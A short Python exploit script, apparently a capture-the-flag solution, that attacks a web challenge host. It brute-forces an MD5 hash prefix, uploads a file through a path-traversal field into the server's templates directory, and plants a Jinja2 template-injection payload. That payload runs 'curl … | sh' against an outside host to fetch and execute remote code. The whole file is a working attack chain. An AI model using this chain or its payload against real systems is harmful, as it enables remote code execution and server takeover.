from requests import *
import hashlib


def make_decaf(prev):

	
	for dummy in range(0, 100000000000000000):

		data = prev + "\n" + str(dummy)
		enc = hashlib.md5()
		enc.update(data.encode())
		md5 = enc.hexdigest()

		if(md5[:5] == "decaf"):

			print("find decaf")
			print(data)
			return data


if __name__ == '__main__':

	host = "https://35749.drinkme.be.ax/"
	url = host + "upload"
	payload = "{{ ''.__class__.__mro__[1].__subclasses__()[200]('curl https://test.nga.observer| sh',shell=True) }}"

	f = open("exploit.html", "w")
	f.write(make_decaf(payload))
	f.close()

	data = {"type": "../templates"}
	files = {"file": open("exploit.html","rb")}
	print("Upload templates/decaf")
	try:
		res = post(url, data=data, files=files)
	except:
		0
	
	print("Attach Shell")
	res = get(host + "decaf").text
